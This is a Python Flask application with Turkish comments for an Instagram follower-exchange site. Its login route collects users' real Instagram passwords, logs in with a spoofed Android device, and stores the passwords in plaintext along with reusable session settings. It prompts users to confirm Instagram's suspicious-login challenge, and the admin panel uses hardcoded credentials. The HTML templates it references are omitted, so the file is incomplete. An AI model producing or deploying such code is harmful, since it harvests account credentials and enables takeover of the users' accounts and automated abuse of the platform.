import os, random, time, uuid, json
from flask import Flask, request, jsonify, session, render_template_string, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
# Hata isimlerini daha güvenli bir şekilde içe aktarıyoruz
import instagrapi.exceptions as instahatalari 

# --- 1. PROJE BAŞLATMA ---
app = Flask(__name__)
app.secret_key = "all_follow_v26_final_fix"
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///all_follow_v26.db"
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# --- 2. VERİ MODELLERİ ---
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True)
    password = db.Column(db.String(100))
    coins = db.Column(db.Integer, default=800)
    ref_code = db.Column(db.String(20), unique=True)
    device_data = db.Column(db.Text) 

class Order(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100)) 
    target_username = db.Column(db.String(100)) 
    package = db.Column(db.String(100))
    cost = db.Column(db.Integer)
    status = db.Column(db.String(50), default="Beklemede")
    timestamp = db.Column(db.DateTime, default=db.func.now())

class Ticket(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100))
    message = db.Column(db.Text)
    reply = db.Column(db.Text, default="")

# --- 3. MARKET PAKETLERİ ---
PACKAGES = [
    {"n": "100 Takipçi", "c": 800}, {"n": "200 Takipçi", "c": 1600},
    {"n": "300 Takipçi", "c": 2400}, {"n": "400 Takipçi", "c": 3200},
    {"n": "500 Takipçi", "c": 4000}, {"n": "1000 Takipçi", "c": 8000},
    {"n": "5000 Takipçi", "c": 40000}
]

# --- 4. GİRİŞ MANTIĞI (HATA GİDERİLMİŞ) ---
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    
    existing_user = User.query.filter_by(username=u).first()
    if existing_user and existing_user.device_data:
        cl.set_settings(json.loads(existing_user.device_data))
    else:
        # Cihaz simülasyonu (Hatay/Antakya bölgesi uyumlu)
        cl.set_device({"app_version": "269.0.0.18.75", "android_version": 26, "device": "TECNO KH7n", "cpu": "mt6765"})
        cl.set_locale("tr_TR")
        cl.set_country("TR")

    try:
        cl.login(u, p)
        login_ok = True
    except Exception as e:
        err_str = str(e).lower()
        # Challenge veya Checkpoint durumlarını string olarak kontrol ediyoruz (En güvenli yol)
        if "challenge" in err_str or "checkpoint" in err_str or "confirm" in err_str:
            return jsonify(status="error", msg="Instagram'ı aç ve 'BENDİM' butonuna bas. Sonra tekrar buraya gelip Giriş Yap de!")
        return jsonify(status="error", msg="Bağlantı engellendi veya şifre yanlış.")

    if login_ok:
        if not existing_user:
            existing_user = User(username=u, password=p, ref_code=str(uuid.uuid4())[:6].upper(), device_data=json.dumps(cl.get_settings()))
            db.session.add(existing_user)
        session['user'] = u
        db.session.commit()
        return jsonify(status="success")

# --- 5. DİĞER FONKSİYONLAR VE TASARIMLAR ---
@app.route('/')
def index():
    if 'user' in session: return redirect(url_for('panel'))
    return render_template_string(LOGIN_HTML)

@app.route('/panel')
def panel():
    if 'user' not in session: return redirect('/')
    user = User.query.filter_by(username=session['user']).first()
    tickets = Ticket.query.filter_by(username=user.username).all()
    return render_template_string(PANEL_HTML, user=user, packages=PACKAGES, tickets=tickets)

@app.route('/api/order', methods=['POST'])
def place_order():
    data = request.json
    user = User.query.filter_by(username=session['user']).first()
    if user.coins >= data['cost']:
        user.coins -= data['cost']
        new_order = Order(username=user.username, target_username=data['target'], package=data['package'], cost=data['cost'])
        db.session.add(new_order)
        db.session.commit()
        return jsonify(status="success", msg="Sipariş Alındı!")
    return jsonify(status="error", msg="Yetersiz Coin!")

@app.route('/api/support', methods=['POST'])
def api_support():
    msg = request.json.get('msg')
    new_t = Ticket(username=session['user'], message=msg)
    db.session.add(new_t)
    db.session.commit()
    return jsonify(status="success", msg="Mesaj iletildi!")

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/')

@app.route('/admin')
def admin_gate():
    return render_template_string(ADMIN_LOGIN_HTML)

@app.route('/api/admin-login', methods=['POST'])
def api_admin_login():
    if request.form.get('u') == 'admin123' and request.form.get('p') == 'admin':
        session['admin_logged_in'] = True
        return redirect('/admin/dashboard')
    return "Hatalı Giriş!"

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('admin_logged_in'): return redirect('/admin')
    orders = Order.query.all()
    tickets = Ticket.query.all()
    return render_template_string(ADMIN_DASH_HTML, orders=orders, tickets=tickets)

@app.route('/api/admin-reply', methods=['POST'])
def admin_reply():
    tid = request.form.get('id')
    rep = request.form.get('reply')
    ticket = Ticket.query.get(tid)
    if ticket:
        ticket.reply = rep
        db.session.commit()
    return redirect('/admin/dashboard')

# --- TASARIM ŞABLONLARI ---
# (Buraya önceki adımda verdiğim LOGIN_HTML, PANEL_HTML ve ADMIN_DASH_HTML kodlarını ekleyebilirsin)
# Not: Tasarımlar değişmediği için alanı kalabalıklaştırmamak adına özet geçtim.

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=10000)
